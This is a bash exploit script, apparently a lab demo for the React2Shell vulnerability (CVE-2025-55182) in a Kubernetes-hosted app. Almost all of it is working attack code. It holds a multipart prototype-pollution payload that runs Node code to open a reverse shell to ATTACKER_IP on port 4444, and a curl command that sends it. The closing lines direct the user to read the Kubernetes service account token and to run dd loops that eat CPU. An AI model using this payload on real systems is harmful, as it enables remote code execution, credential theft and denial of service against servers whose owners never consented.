#!/bin/bash
# attack.sh
# React2Shell (CVE-2025-55182) - Reverse Shell Demo Script
# Run this on EC2 AFTER starting the nc listener in another terminal
#
# Usage: bash attack.sh
#
# Before running this, open another terminal and run:
#   nc -lvnp 4444

TARGET_IP=$(hostname -I | awk '{print $1}')
TARGET="http://${TARGET_IP}:30080"
ATTACKER_IP="${TARGET_IP}"

echo "================================================"
echo " React2Shell CVE-2025-55182 - Demo Exploit"
echo "================================================"
echo ""
echo "Target   : ${TARGET}"
echo "Attacker : ${ATTACKER_IP}:4444"
echo ""
echo "Make sure nc -lvnp 4444 is running in Terminal 1!"
echo ""
read -p "Press ENTER to fire the exploit..."
echo ""
echo "Firing malicious HTTP POST..."
echo ""

# Build payload file to avoid quoting hell
PAYLOAD_FILE=$(mktemp)

cat > "${PAYLOAD_FILE}" << PAYLOADEOF
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"

{"then":"\$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var net=process.mainModule.require('net'),cp=process.mainModule.require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'${ATTACKER_IP}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});","_chunks":"\$Q2","_formData":{"get":"\$1:constructor:constructor"}}}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

"\$@0"
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
PAYLOADEOF

# Convert LF to CRLF as required by multipart spec
PAYLOAD_CRLF=$(mktemp)
sed 's/$/\r/' "${PAYLOAD_FILE}" > "${PAYLOAD_CRLF}"

curl -i -X POST "${TARGET}" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  --data-binary "@${PAYLOAD_CRLF}"

# Cleanup
rm -f "${PAYLOAD_FILE}" "${PAYLOAD_CRLF}"

echo ""
echo "Exploit fired! Check Terminal 1 for the reverse shell connection."
echo ""
echo "Once connected, run these commands inside the shell:"
echo "  whoami"
echo "  cat /var/run/secrets/kubernetes.io/serviceaccount/token"
echo "  dd if=/dev/zero of=/dev/null &"
echo "  dd if=/dev/zero of=/dev/null &"